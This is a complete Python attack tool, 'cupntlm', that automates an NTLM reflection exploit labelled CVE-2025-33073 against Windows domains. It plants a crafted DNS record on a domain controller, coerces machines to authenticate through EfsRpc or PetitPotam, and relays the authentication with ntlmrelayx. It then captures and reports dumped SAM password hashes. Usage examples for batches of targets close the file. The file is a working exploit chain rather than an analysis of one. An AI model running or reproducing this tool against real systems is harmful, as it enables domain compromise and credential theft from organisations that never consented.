#!/usr/bin/env python3

import os
import sys
import time
import socket
import struct
import signal
import threading
import argparse
import subprocess
from datetime import datetime

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = BLUE = WHITE = ""
    class Style:
        BRIGHT = RESET_ALL = ""

try:
    from impacket.ldap import ldap as impacket_ldap
    IMPACKET_OK = True
except ImportError:
    IMPACKET_OK = False

try:
    from impacket.smbconnection import SMBConnection
    SMB_OK = True
except ImportError:
    SMB_OK = False

try:
    from impacket.dcerpc.v5 import transport, efsrpc
    from impacket.dcerpc.v5.rpcrt import DCERPCException
    DCERPC_OK = True
except ImportError:
    try:
        from impacket.dcerpc.v5 import transport
        from impacket.dcerpc.v5.rpcrt import DCERPCException
        DCERPC_OK = False
    except ImportError:
        DCERPC_OK = False

try:
    import dns.resolver
    DNS_LIB = True
except ImportError:
    DNS_LIB = False

MARSHALLED_SUFFIX  = "1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA"
SINGLE_RECORD      = "localhost" + MARSHALLED_SUFFIX
DNS_VERIFY_RETRIES = 6
DNS_VERIFY_DELAY   = 3
RELAY_STARTUP_WAIT = 4
COERCE_WAIT        = 15
VERSION            = "1.0.0"
AUTHOR             = "cupcake"

LOG_FILE  = f"cupntlm_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
_log_lock = threading.Lock()


def log(msg, level="INFO"):
    colors = {
        "INFO":    Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "FAIL":    Fore.RED,
        "WARN":    Fore.YELLOW,
        "STEP":    Fore.MAGENTA,
        "RESULT":  Fore.GREEN + Style.BRIGHT,
        "SECTION": Fore.BLUE  + Style.BRIGHT,
        "DATA":    Fore.WHITE + Style.BRIGHT,
    }
    icons = {
        "INFO":    "[*]",
        "SUCCESS": "[+]",
        "FAIL":    "[-]",
        "WARN":    "[!]",
        "STEP":    "[>]",
        "RESULT":  "[✓]",
        "SECTION": "[═]",
        "DATA":    "[#]",
    }
    ts = datetime.now().strftime("%H:%M:%S")
    with _log_lock:
        print(f"[{ts}] {colors.get(level, Fore.WHITE)}{icons.get(level, '[?]')} {msg}{Style.RESET_ALL}")
        with open(LOG_FILE, "a") as f:
            f.write(f"[{ts}] [{level}] {msg}\n")


def section(title):
    log(f"{'─' * 10} {title} {'─' * 10}", "SECTION")


def banner(mode):
    print(f"""
{Fore.CYAN}{Style.BRIGHT}
   ██████╗██╗   ██╗██████╗ ███╗   ██╗████████╗██╗     ███╗   ███╗
  ██╔════╝██║   ██║██╔══██╗████╗  ██║╚══██╔══╝██║     ████╗ ████║
  ██║     ██║   ██║██████╔╝██╔██╗ ██║   ██║   ██║     ██╔████╔██║
  ██║     ██║   ██║██╔═══╝ ██║╚██╗██║   ██║   ██║     ██║╚██╔╝██║
  ╚██████╗╚██████╔╝██║     ██║ ╚████║   ██║   ███████╗██║ ╚═╝ ██║
   ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝     ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}  CVE-2025-33073  |  NTLM Reflection Bypass  |  v{VERSION}{Style.RESET_ALL}
{Fore.CYAN}  by {Fore.WHITE}{AUTHOR}{Style.RESET_ALL}   {Fore.CYAN}mode: {Fore.WHITE}{mode}{Style.RESET_ALL}
""")


def load_targets(path):
    if not os.path.exists(path):
        log(f"targets file not found: {path}", "FAIL")
        sys.exit(1)
    targets = [l.strip() for l in open(path) if l.strip() and not l.startswith("#")]
    log(f"{len(targets)} targets loaded", "SUCCESS")
    return targets


class DNSManager:
    def __init__(self, dc_ip, domain, user, password):
        self.dc_ip    = dc_ip
        self.domain   = domain
        self.user     = user
        self.password = password
        self.conn     = None
        self._dn_base = ",".join([f"DC={x}" for x in domain.split(".")])

    def connect(self):
        try:
            self.conn = impacket_ldap.LDAPConnection(
                f"ldap://{self.dc_ip}", self._dn_base
            )
            self.conn.login(self.user, self.password, self.domain, "", "")
            log(f"LDAP connected: {self.dc_ip}", "SUCCESS")
            return True
        except Exception as e:
            log(f"LDAP error: {e}", "FAIL")
            return False

    def add_record(self, record_name, relay_ip):
        section(f"DNS Add: {record_name} -> {relay_ip}")
        return self._dnstool("add", record_name, relay_ip)

    def remove_record(self, record_name):
        section(f"DNS Remove: {record_name}")
        return self._dnstool("remove", record_name)

    def _dnstool(self, action, record_name, relay_ip=None):
        cmd = [
            "python3", "dnstool.py",
            "-u", f"{self.domain}\\{self.user}",
            "-p", self.password,
            self.dc_ip, "-a", action, "-r", record_name,
        ]
        if relay_ip and action == "add":
            cmd += ["-d", relay_ip]
        try:
            r   = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
            out = r.stdout + r.stderr
            if "successfully" in out.lower() or r.returncode == 0:
                log(f"DNS {action} ok: {record_name}", "SUCCESS")
                return True
            log(f"DNS {action} failed:\n{out.strip()}", "FAIL")
            return False
        except FileNotFoundError:
            log("dnstool.py not found", "FAIL")
            return False
        except subprocess.TimeoutExpired:
            log(f"DNS {action} timeout", "FAIL")
            return False

    def _resolve(self, fqdn):
        if DNS_LIB:
            try:
                r = dns.resolver.Resolver()
                r.nameservers   = [self.dc_ip]
                r.timeout       = 5
                r.lifetime      = 5
                return [str(a) for a in r.resolve(fqdn, "A")]
            except dns.resolver.NXDOMAIN:
                return []
            except Exception:
                pass
        try:
            r = subprocess.run(
                ["nslookup", fqdn, self.dc_ip],
                capture_output=True, text=True, timeout=10
            )
            ips = []
            for line in r.stdout.splitlines():
                if "Address" in line and self.dc_ip not in line and "#" not in line:
                    ip = line.split(":")[-1].strip()
                    if ip and ip[0].isdigit():
                        ips.append(ip)
            return ips
        except Exception:
            return []

    def query_record(self, record_name):
        fqdn = f"{record_name}.{self.domain}"
        log(f"DNS query: {fqdn}", "STEP")
        ips = self._resolve(fqdn)
        if ips:
            log(f"resolved: {fqdn} -> {ips[0]}", "SUCCESS")
            return ips[0]
        log(f"not found: {fqdn}", "WARN")
        return None

    def verify(self, record_name, expected_ip, wait_forever=False):
        section(f"DNS Verify: {record_name}")
        fqdn = f"{record_name}.{self.domain}"

        if wait_forever:
            log("waiting for record propagation (Ctrl+C to abort)...", "INFO")

        attempt = 0
        while True:
            attempt += 1
            label = f"attempt {attempt}" if wait_forever else f"attempt {attempt}/{DNS_VERIFY_RETRIES}"
            log(label, "STEP")

            ips = self._resolve(fqdn)
            if ips:
                log(f"resolved: {fqdn} -> {ips}", "INFO")
                if expected_ip in ips:
                    log(f"DNS verified: {fqdn} -> {expected_ip}", "SUCCESS")
                    return True
                log(f"wrong IP: expected={expected_ip} got={ips}", "WARN")
                return False
            else:
                log(f"NXDOMAIN, retrying in {DNS_VERIFY_DELAY}s...", "WARN")

            if not wait_forever and attempt >= DNS_VERIFY_RETRIES:
                log("DNS verify failed (max retries)", "FAIL")
                return False

            time.sleep(DNS_VERIFY_DELAY)

    def disconnect(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception:
            pass


class SMBChecker:
    @staticmethod
    def check(target):
        section(f"SMB Signing: {target}")

        if SMB_OK:
            try:
                conn    = SMBConnection(target, target, timeout=10)
                signing = conn.isSigningRequired()
                conn.close()
                if signing:
                    log(f"signing required, relay won't work: {target}", "WARN")
                    return False
                log(f"signing disabled, target is vulnerable: {target}", "SUCCESS")
                return True
            except Exception as e:
                log(f"SMB check error: {e}", "WARN")

        for tool in [["nxc", "smb", target], ["crackmapexec", "smb", target]]:
            try:
                r   = subprocess.run(tool, capture_output=True, text=True, timeout=15)
                out = r.stdout + r.stderr
                if "signing:False" in out or "signing: False" in out:
                    log(f"signing disabled ({tool[0]})", "SUCCESS"); return True
                if "signing:True" in out or "signing: True" in out:
                    log(f"signing enabled ({tool[0]})", "WARN");    return False
            except FileNotFoundError:
                continue

        try:
            r = subprocess.run(
                ["nmap", "--script", "smb2-security-mode", "-p", "445", target],
                capture_output=True, text=True, timeout=20
            )
            if "not required" in r.stdout:
                log("signing not required", "SUCCESS"); return True
            if "and required" in r.stdout:
                log("signing required", "WARN");        return False
        except FileNotFoundError:
            pass

        log("could not determine signing status, continuing", "WARN")
        return True


class Coercer:
    def __init__(self, domain, user, password):
        self.domain   = domain
        self.user     = user
        self.password = password

    def coerce(self, target, listener):
        section(f"Coerce: {target} -> {listener}")

        if DCERPC_OK and self._efsrpc(target, listener):
            return True
        return self._petitpotam(target, listener)

    def _efsrpc(self, target, listener):
        try:
            log("connecting via EfsRpc...", "STEP")
            binding = f"ncacn_np:{target}[\\pipe\\lsarpc]"
            trans   = transport.DCERPCTransportFactory(binding)
            trans.set_credentials(self.user, self.password, self.domain, "", "", None)
            dce = trans.get_dce_rpc()
            dce.connect()
            try:
                dce.bind(efsrpc.MSRPC_UUID_EFSR)
                path = f"\\\\{listener}\\share"
                log(f"EfsRpcEncryptFileSrv -> {path}", "STEP")
                try:
                    efsrpc.hEfsRpcEncryptFileSrv(dce, path)
                except DCERPCException as e:
                    if "ERROR_BAD_NETPATH" in str(e) or "rpc_s_access_denied" in str(e):
                        log("coerce sent (expected error received)", "SUCCESS")
                        return True
                    log(f"EfsRpc error: {e}", "WARN")
                    return False
            finally:
                dce.disconnect()
        except Exception as e:
            log(f"DCERPC error: {e}", "WARN")
            return False

    def _petitpotam(self, target, listener):
        log("falling back to PetitPotam.py...", "WARN")
        cmd = [
            "python3", "PetitPotam.py",
            "-u", self.user, "-p", self.password,
            "-d", self.domain,
            listener, target,
        ]
        try:
            r   = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            out = r.stdout + r.stderr
            log(f"PetitPotam output:\n{out.strip()}", "INFO")
            if "Attack worked" in out or "Got expected" in out:
                log("coerce successful", "SUCCESS"); return True
            log("coerce failed", "FAIL");            return False
        except FileNotFoundError:
            log("PetitPotam.py not found", "FAIL"); return False
        except subprocess.TimeoutExpired:
            log("PetitPotam timeout", "FAIL");      return False


class RelayManager:
    def __init__(self, target, out_dir):
        self.target       = target
        self.proc         = None
        self._tail_stop   = threading.Event()
        self._tail_thread = None
        self.outfile      = os.path.join(
            out_dir,
            f"relay_{target.replace('.', '_')}.txt"
        )

    def start(self):
        for binary in ["impacket-ntlmrelayx", "ntlmrelayx.py"]:
            cmd = (
                ["impacket-ntlmrelayx",
                 "-t", f"smb://{self.target}", "-smb2support",
                 "--no-http-server", "--no-wcf-server"]
                if binary == "impacket-ntlmrelayx"
                else ["python3", "ntlmrelayx.py",
                      "-t", f"smb://{self.target}", "-smb2support",
                      "--no-http-server", "--no-wcf-server"]
            )
            log(f"starting ntlmrelayx -> {self.target}", "STEP")
            try:
                with open(self.outfile, "w") as f:
                    self.proc = subprocess.Popen(cmd, stdout=f, stderr=subprocess.STDOUT)
                time.sleep(RELAY_STARTUP_WAIT)
                if self.proc.poll() is None:
                    log(f"ntlmrelayx running [PID {self.proc.pid}]", "SUCCESS")
                    self._start_tail()
                    return True
                log(f"ntlmrelayx exited early ({binary})", "WARN")
            except FileNotFoundError:
                continue

        log("ntlmrelayx not found, install impacket", "FAIL")
        return False

    def _start_tail(self):
        self._tail_stop.clear()

        def tail():
            try:
                with open(self.outfile, "r") as f:
                    f.seek(0, 2)
                    while not self._tail_stop.is_set():
                        line = f.readline()
                        if line:
                            stripped = line.rstrip()
                            if stripped:
                                print(f"  {Fore.WHITE}{stripped}{Style.RESET_ALL}")
                        else:
                            time.sleep(0.2)
            except Exception:
                pass

        self._tail_thread = threading.Thread(target=tail, daemon=True)
        self._tail_thread.start()

    def _stop_tail(self):
        self._tail_stop.set()
        if self._tail_thread:
            self._tail_thread.join(timeout=2)

    def stop(self):
        self._stop_tail()
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:    self.proc.wait(timeout=5)
            except: self.proc.kill()
            log(f"ntlmrelayx stopped -> {self.target}", "INFO")

    def output(self):
        try:    return open(self.outfile).read()
        except: return ""

    def success(self):
        out = self.output()
        return any(m in out for m in ["SUCCEED", "SAM hashes", "Dumping local SAM", "Administrator:"])

    def get_hashes(self):
        return [l.strip() for l in self.output().splitlines() if ":::" in l]


class CupNTLM:
    def __init__(self, args):
        self.args    = args
        self.results = {}
        self.out_dir = args.output
        self.dns     = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        self.coercer = Coercer(args.domain, args.user, args.password)
        os.makedirs(self.out_dir, exist_ok=True)

    def run_single(self, targets):
        section("MODE: SINGLE")
        log(f"using universal record: {SINGLE_RECORD}", "INFO")
        log("DNS record will NOT be removed automatically after run", "WARN")
        log("run 'clear' subcommand to clean up when done", "WARN")

        added = self.dns.add_record(SINGLE_RECORD, self.args.relay_ip)
        if not added:
            log("failed to add DNS record, aborting", "FAIL")
            return

        ok = self.dns.verify(SINGLE_RECORD, self.args.relay_ip, wait_forever=True)
        if not ok and not self.args.force:
            log("DNS verify failed (wrong IP). use --force to skip", "FAIL")
            return

        for i, target in enumerate(targets, 1):
            section(f"TARGET {i}/{len(targets)}: {target}")
            self._attack(target, SINGLE_RECORD, auto_cleanup=False)

        self.dns.disconnect()
        log("single mode done — DNS record still active on DC", "WARN")
        log("to clean up: python3 cupntlm.py clear --domain .. --user .. --pass .. --dc-ip ..", "WARN")

    def run_per_target(self, targets):
        section("MODE: PER-TARGET")
        for i, target in enumerate(targets, 1):
            section(f"TARGET {i}/{len(targets)}: {target}")
            record = target.split(".")[0].lower() + MARSHALLED_SUFFIX
            self._attack(target, record, auto_cleanup=True)

    def run_relay_only(self, targets):
        section("MODE: RELAY-ONLY")
        log("assuming DNS record is already in place", "WARN")

        ok = self.dns.verify(SINGLE_RECORD, self.args.relay_ip, wait_forever=False)
        if not ok and not self.args.force:
            log("DNS record not found, run dns-add or single first", "FAIL")
            return

        for i, target in enumerate(targets, 1):
            section(f"TARGET {i}/{len(targets)}: {target}")
            self._attack(target, SINGLE_RECORD, auto_cleanup=False)

    def _attack(self, target, record, auto_cleanup):
        self.results[target] = dict(
            smb_ok=False, dns_added=False, dns_ok=False,
            relay_ok=False, coerce_ok=False, pwned=False,
            hashes=[], output=""
        )
        relay = RelayManager(target, self.out_dir)

        try:
            if auto_cleanup:
                added = self.dns.add_record(record, self.args.relay_ip)
                self.results[target]["dns_added"] = added
                if not added:
                    return
                ok = self.dns.verify(record, self.args.relay_ip, wait_forever=False)
                self.results[target]["dns_ok"] = ok
                if not ok and not self.args.force:
                    return
            else:
                self.results[target]["dns_ok"] = True

            smb = SMBChecker.check(target)
            self.results[target]["smb_ok"] = smb
            if not smb:
                log(f"skipping {target} (signing required)", "WARN")
                return

            if not relay.start():
                self.results[target]["relay_ok"] = False
                return
            self.results[target]["relay_ok"] = True

            coerce_ok = self.coercer.coerce(target, record)
            self.results[target]["coerce_ok"] = coerce_ok

            log(f"waiting for auth ({COERCE_WAIT}s)...", "INFO")
            time.sleep(COERCE_WAIT)

            pwned  = relay.success()
            hashes = relay.get_hashes()
            self.results[target]["pwned"]  = pwned
            self.results[target]["hashes"] = hashes
            self.results[target]["output"] = relay.output()

            if pwned:
                print(f"\n{Fore.YELLOW}{Style.BRIGHT}")
                print("  ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗ ")
                print("  ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗")
                print("  ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║")
                print("  ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║")
                print("  ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝")
                print(f"  ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝  -> {target}")
                print(f"{Style.RESET_ALL}")

                section("ntlmrelayx output")
                full_out = relay.output()
                for line in full_out.splitlines():
                    if line.strip():
                        print(f"  {Fore.WHITE}{line}{Style.RESET_ALL}")

                if hashes:
                    print()
                    section("captured hashes")
                    for h in hashes:
                        print(f"  {Fore.YELLOW}{Style.BRIGHT}{h}{Style.RESET_ALL}")
                    print()
            else:
                log(f"relay failed -> {target}", "FAIL")

        finally:
            relay.stop()
            if auto_cleanup and self.results[target].get("dns_added"):
                self.dns.remove_record(record)

    def report(self):
        section("SUMMARY")
        total   = len(self.results)
        pwned   = sum(1 for r in self.results.values() if r["pwned"])
        skipped = sum(1 for r in self.results.values() if not r["smb_ok"])

        print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════╗
║  Total targets   : {str(total):<27}║
║  Relay success   : {Fore.GREEN}{str(pwned):<27}{Fore.CYAN}║
║  Skipped signing : {Fore.YELLOW}{str(skipped):<27}{Fore.CYAN}║
╚══════════════════════════════════════════════╝{Style.RESET_ALL}
""")
        for target, r in self.results.items():
            status = (
                f"{Fore.GREEN}PWNED{Style.RESET_ALL}"
                if r["pwned"]
                else f"{Fore.RED}FAILED{Style.RESET_ALL}"
            )
            print(f"  {Fore.WHITE}{target:<35}{Style.RESET_ALL} -> {status}")
            for h in r.get("hashes", []):
                print(f"    {Fore.GREEN}{h}{Style.RESET_ALL}")

        rpath = os.path.join(self.out_dir, "report.txt")
        with open(rpath, "w") as f:
            f.write(f"cupntlm — CVE-2025-33073\n")
            f.write(f"by {AUTHOR}\n")
            f.write(f"date   : {datetime.now()}\n")
            f.write(f"domain : {self.args.domain}\n")
            f.write(f"dc     : {self.args.dc_ip}\n")
            f.write("=" * 50 + "\n\n")
            for target, r in self.results.items():
                f.write(f"target: {target}\n")
                for k, v in r.items():
                    if k not in ("output", "hashes"):
                        f.write(f"  {k:<15}: {v}\n")
                for h in r.get("hashes", []):
                    f.write(f"  hash: {h}\n")
                f.write("\n")
        log(f"report : {rpath}",    "SUCCESS")
        log(f"log    : {LOG_FILE}", "SUCCESS")


USAGE_EXAMPLES = """
examples:
  single mode (recommended) — one universal DNS record, all targets:
    sudo python3 cupntlm.py single \\
        --targets targets.txt --domain lab.local \\
        --user pentester --pass 'Pass123!' \\
        --dc-ip 192.168.1.10 --relay-ip 192.168.1.20

  clean up DNS record left by single mode:
    sudo python3 cupntlm.py clear \\
        --domain lab.local --user pentester --pass 'Pass123!' \\
        --dc-ip 192.168.1.10

  per-target mode — separate DNS record per host (auto-cleaned):
    sudo python3 cupntlm.py per-target \\
        --targets targets.txt --domain lab.local \\
        --user pentester --pass 'Pass123!' \\
        --dc-ip 192.168.1.10 --relay-ip 192.168.1.20

  relay only — DNS already set, just relay+coerce:
    sudo python3 cupntlm.py relay-only \\
        --targets targets.txt --domain lab.local \\
        --user pentester --pass 'Pass123!' \\
        --dc-ip 192.168.1.10 --relay-ip 192.168.1.20

  add / remove / check DNS record manually:
    sudo python3 cupntlm.py dns-add    --domain lab.local --user pentester --pass 'Pass123!' --dc-ip 192.168.1.10 --relay-ip 192.168.1.20
    sudo python3 cupntlm.py dns-remove --domain lab.local --user pentester --pass 'Pass123!' --dc-ip 192.168.1.10
    sudo python3 cupntlm.py dns-check  --domain lab.local --user pentester --pass 'Pass123!' --dc-ip 192.168.1.10 --relay-ip 192.168.1.20

notes:
  - requires: pip install impacket colorama dnspython
  - single mode does NOT auto-delete the DNS record on exit, use 'clear' when done
  - per-target mode creates and removes a DNS record for each host automatically
  - dnstool.py (from krbrelayx) must be present for DNS operations
"""


def main():
    parser = argparse.ArgumentParser(
        prog="cupntlm",
        description=f"cupntlm v{VERSION} — CVE-2025-33073 NTLM Reflection Bypass  |  by {AUTHOR}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=USAGE_EXAMPLES,
    )
    sub = parser.add_subparsers(dest="command", required=True)

    def add_common(p):
        p.add_argument("--domain",   required=True, metavar="DOMAIN",   help="AD domain name (e.g. corp.local)")
        p.add_argument("--user",     required=True, metavar="USER",     help="domain username")
        p.add_argument("--pass",     required=True, metavar="PASS",     dest="password", help="password")
        p.add_argument("--dc-ip",    required=True, metavar="DC_IP",    help="domain controller IP")
        p.add_argument("--relay-ip", required=True, metavar="RELAY_IP", help="attacker machine IP (listener)")
        p.add_argument("--output",   default="output", metavar="DIR",   help="output directory (default: output)")
        p.add_argument("--force",    action="store_true",               help="skip DNS verify errors and continue")

    def add_targets(p):
        p.add_argument("--targets", required=True, metavar="FILE", help="file with target IPs/hostnames (one per line)")
        p.add_argument("--threads", type=int, default=1, metavar="N", help="parallel threads (default: 1)")

    p_single = sub.add_parser(
        "single",
        help="universal DNS record, attack all targets — DNS record persists after run (use 'clear' to remove)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_common(p_single)
    add_targets(p_single)

    p_clear = sub.add_parser(
        "clear",
        help="remove the DNS record left by single mode",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p_clear.add_argument("--domain",   required=True, metavar="DOMAIN")
    p_clear.add_argument("--user",     required=True, metavar="USER")
    p_clear.add_argument("--pass",     required=True, metavar="PASS",     dest="password")
    p_clear.add_argument("--dc-ip",    required=True, metavar="DC_IP")
    p_clear.add_argument("--relay-ip", default="",    metavar="RELAY_IP")
    p_clear.add_argument("--output",   default="output")
    p_clear.add_argument("--force",    action="store_true")

    p_per = sub.add_parser(
        "per-target",
        help="individual DNS record per target, auto-cleaned after each attempt",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_common(p_per)
    add_targets(p_per)

    p_relay = sub.add_parser(
        "relay-only",
        help="DNS already in place — skip DNS setup, only relay+coerce",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_common(p_relay)
    add_targets(p_relay)

    p_dns_add = sub.add_parser(
        "dns-add",
        help="add the reflection DNS record to the DC and verify",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_common(p_dns_add)

    p_dns_rem = sub.add_parser(
        "dns-remove",
        help="remove the reflection DNS record from the DC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p_dns_rem.add_argument("--domain",   required=True, metavar="DOMAIN")
    p_dns_rem.add_argument("--user",     required=True, metavar="USER")
    p_dns_rem.add_argument("--pass",     required=True, metavar="PASS",     dest="password")
    p_dns_rem.add_argument("--dc-ip",    required=True, metavar="DC_IP")
    p_dns_rem.add_argument("--relay-ip", default="",    metavar="RELAY_IP")
    p_dns_rem.add_argument("--output",   default="output")
    p_dns_rem.add_argument("--force",    action="store_true")

    p_dns_chk = sub.add_parser(
        "dns-check",
        help="query the DC to verify the reflection record resolves correctly",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    add_common(p_dns_chk)

    args = parser.parse_args()
    banner(args.command)

    if not IMPACKET_OK:
        log("impacket not installed — pip install impacket", "FAIL")
        sys.exit(1)

    if args.command == "clear":
        section("CLEAR — removing single-mode DNS record")
        log(f"record: {SINGLE_RECORD}", "INFO")
        d = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        ok = d.remove_record(SINGLE_RECORD)
        log("record removed" if ok else "failed to remove record",
            "SUCCESS" if ok else "FAIL")
        d.disconnect()
        return

    tool = CupNTLM(args)

    def handle_exit(sig, frame):
        log("interrupted — writing report...", "WARN")
        tool.report()
        tool.dns.disconnect()
        sys.exit(0)
    signal.signal(signal.SIGINT, handle_exit)

    if args.command in ("single", "per-target", "relay-only"):
        targets = load_targets(args.targets)
        if not targets:
            log("no targets found", "FAIL")
            sys.exit(1)

        if args.command == "single":
            tool.run_single(targets)
        elif args.command == "per-target":
            tool.run_per_target(targets)
        elif args.command == "relay-only":
            tool.run_relay_only(targets)

        tool.report()

    elif args.command == "dns-add":
        d = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        if d.add_record(SINGLE_RECORD, args.relay_ip):
            d.verify(SINGLE_RECORD, args.relay_ip)
        d.disconnect()

    elif args.command == "dns-remove":
        d = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        d.remove_record(SINGLE_RECORD)
        d.disconnect()

    elif args.command == "dns-check":
        d  = DNSManager(args.dc_ip, args.domain, args.user, args.password)
        ip = d.query_record(SINGLE_RECORD)
        if ip:
            ok = d.verify(SINGLE_RECORD, args.relay_ip)
            log("correct IP" if ok else "wrong IP", "SUCCESS" if ok else "FAIL")
        else:
            log("record not found on DC", "FAIL")
        d.disconnect()


if __name__ == "__main__":
    main()
